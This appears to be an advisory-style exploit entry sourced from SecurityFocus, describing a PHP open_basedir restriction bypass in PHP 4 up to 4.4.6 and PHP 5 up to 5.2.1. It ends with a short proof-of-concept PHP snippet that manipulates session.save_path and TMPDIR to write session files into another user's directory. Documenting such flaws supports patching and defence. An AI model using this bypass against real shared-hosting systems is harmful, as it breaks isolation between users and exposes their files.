@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/23183/info
+
+PHP is prone to a 'open_basedir' restriction-bypass vulnerability due to a design error.
+
+Successful exploits could allow an attacker to access sensitive information or to write files in unauthorized locations.
+
+This vulnerability would be an issue in shared-hosting configurations where multiple users can create and execute arbitrary PHP script code; in such cases, the 'safe_mode' and 'open_basedir' restrictions are expected to isolate users from each other.
+
+The following versions are vulnerable:
+
+PHP 4 up to and including 4.4.6
+PHP 5 up to and including 5.2.1 
+
+<?php
+  ini_set("session.save_path", "/sessions/user2/");
+  putenv("TMPDIR=/sessions/user2/");
+  ini_set("session.save_path", "");
+  @session_start();
+?>
